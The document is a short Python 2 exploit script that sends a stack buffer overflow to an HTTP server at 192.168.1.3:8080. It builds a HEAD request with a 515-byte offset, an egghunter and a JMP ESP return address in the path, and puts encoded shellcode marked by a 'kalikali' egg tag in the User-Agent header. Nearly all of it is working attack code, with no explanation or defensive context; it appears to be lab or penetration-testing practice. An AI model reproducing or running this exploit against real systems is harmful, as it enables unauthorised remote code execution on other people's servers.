#!/usr/bin/python

import os,sys,socket
# JMP ESP 0x7e429353

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x6b\x61\x6c\x69\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# offset: 515
stage1 = "A"*(515-32-7) + egghunter + "A" * 7 + "\x53\x93\x42\x7e"  + "\xeb\xce"

shellcode =  ""
shellcode += "\x89\xe3\xdb\xc1\xd9\x73\xf4\x5e\x56\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x69\x6c\x4d\x38\x4d\x52\x55\x50\x35\x50\x45\x50"
shellcode += "\x43\x50\x4d\x59\x69\x75\x34\x71\x4f\x30\x55\x34"
shellcode += "\x6e\x6b\x76\x30\x34\x70\x4e\x6b\x61\x42\x74\x4c"
shellcode += "\x4c\x4b\x62\x72\x46\x74\x4c\x4b\x32\x52\x55\x78"
shellcode += "\x46\x6f\x38\x37\x32\x6a\x57\x56\x34\x71\x6b\x4f"
shellcode += "\x6e\x4c\x37\x4c\x30\x61\x31\x6c\x76\x62\x54\x6c"
shellcode += "\x35\x70\x49\x51\x4a\x6f\x44\x4d\x47\x71\x4a\x67"
shellcode += "\x49\x72\x7a\x52\x31\x42\x72\x77\x6e\x6b\x63\x62"
shellcode += "\x52\x30\x6e\x6b\x63\x7a\x35\x6c\x4e\x6b\x32\x6c"
shellcode += "\x52\x31\x64\x38\x78\x63\x61\x58\x46\x61\x6b\x61"
shellcode += "\x70\x51\x4c\x4b\x33\x69\x47\x50\x63\x31\x58\x53"
shellcode += "\x6c\x4b\x50\x49\x42\x38\x49\x73\x45\x6a\x32\x69"
shellcode += "\x4e\x6b\x47\x44\x4e\x6b\x36\x61\x6b\x66\x75\x61"
shellcode += "\x79\x6f\x4e\x4c\x6f\x31\x6a\x6f\x74\x4d\x57\x71"
shellcode += "\x79\x57\x50\x38\x69\x70\x74\x35\x6b\x46\x36\x63"
shellcode += "\x53\x4d\x6a\x58\x65\x6b\x63\x4d\x34\x64\x51\x65"
shellcode += "\x4b\x54\x52\x78\x4e\x6b\x46\x38\x46\x44\x65\x51"
shellcode += "\x39\x43\x62\x46\x6e\x6b\x34\x4c\x42\x6b\x6e\x6b"
shellcode += "\x63\x68\x37\x6c\x43\x31\x78\x53\x6c\x4b\x66\x64"
shellcode += "\x6e\x6b\x36\x61\x4e\x30\x4c\x49\x37\x34\x67\x54"
shellcode += "\x55\x74\x53\x6b\x71\x4b\x50\x61\x56\x39\x42\x7a"
shellcode += "\x73\x61\x59\x6f\x59\x70\x53\x6f\x51\x4f\x30\x5a"
shellcode += "\x4e\x6b\x65\x42\x6a\x4b\x4c\x4d\x73\x6d\x53\x58"
shellcode += "\x47\x43\x65\x62\x63\x30\x47\x70\x65\x38\x34\x37"
shellcode += "\x73\x43\x64\x72\x53\x6f\x31\x44\x33\x58\x50\x4c"
shellcode += "\x71\x67\x77\x56\x55\x57\x69\x6f\x5a\x75\x6f\x48"
shellcode += "\x6c\x50\x33\x31\x73\x30\x77\x70\x71\x39\x6f\x34"
shellcode += "\x71\x44\x46\x30\x65\x38\x77\x59\x4b\x30\x50\x6b"
shellcode += "\x57\x70\x59\x6f\x78\x55\x30\x50\x56\x30\x32\x70"
shellcode += "\x32\x70\x63\x70\x62\x70\x61\x50\x50\x50\x52\x48"
shellcode += "\x4b\x5a\x46\x6f\x59\x4f\x59\x70\x69\x6f\x68\x55"
shellcode += "\x6f\x67\x30\x6a\x56\x65\x63\x58\x69\x50\x39\x38"
shellcode += "\x57\x71\x63\x34\x73\x58\x44\x42\x45\x50\x46\x7a"
shellcode += "\x57\x7a\x6f\x79\x49\x76\x61\x7a\x36\x70\x36\x36"
shellcode += "\x66\x37\x75\x38\x4c\x59\x4c\x65\x61\x64\x53\x51"
shellcode += "\x4b\x4f\x4e\x35\x6e\x65\x59\x50\x54\x34\x34\x4c"
shellcode += "\x6b\x4f\x32\x6e\x37\x78\x61\x65\x68\x6c\x31\x78"
shellcode += "\x5a\x50\x38\x35\x4e\x42\x36\x36\x79\x6f\x78\x55"
shellcode += "\x53\x58\x43\x53\x50\x6d\x51\x74\x65\x50\x6f\x79"
shellcode += "\x48\x63\x51\x47\x31\x47\x36\x37\x54\x71\x58\x76"
shellcode += "\x63\x5a\x56\x72\x46\x39\x52\x76\x58\x62\x69\x6d"
shellcode += "\x43\x56\x4a\x67\x77\x34\x56\x44\x47\x4c\x56\x61"
shellcode += "\x75\x51\x6e\x6d\x72\x64\x55\x74\x72\x30\x79\x56"
shellcode += "\x53\x30\x63\x74\x36\x34\x50\x50\x52\x76\x53\x66"
shellcode += "\x56\x36\x51\x56\x73\x66\x32\x6e\x42\x76\x70\x56"
shellcode += "\x31\x43\x71\x46\x42\x48\x70\x79\x5a\x6c\x67\x4f"
shellcode += "\x4e\x66\x49\x6f\x6a\x75\x4f\x79\x49\x70\x50\x4e"
shellcode += "\x66\x36\x31\x56\x59\x6f\x66\x50\x43\x58\x63\x38"
shellcode += "\x6f\x77\x57\x6d\x75\x30\x79\x6f\x4e\x35\x4f\x4b"
shellcode += "\x68\x70\x6f\x45\x4c\x62\x33\x66\x53\x58\x4f\x56"
shellcode += "\x4e\x75\x6d\x6d\x4f\x6d\x4b\x4f\x69\x45\x37\x4c"
shellcode += "\x66\x66\x61\x6c\x55\x5a\x6b\x30\x6b\x4b\x59\x70"
shellcode += "\x53\x45\x77\x75\x4d\x6b\x70\x47\x64\x53\x74\x32"
shellcode += "\x50\x6f\x43\x5a\x77\x70\x43\x63\x59\x6f\x4e\x35"
shellcode += "\x41\x41"


stage2 = "kalikali" + shellcode # 6b616c69

buffer = (
"HEAD /" + stage1 + " HTTP/1.1\r\n"
"Host: 192.168.1.3:8080\r\n"
"User-Agent: " + stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

ip = "192.168.1.3"
port = 8080

print "[*] Trying to connect"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(buffer)
print "[*] Payload sent"
s.close()
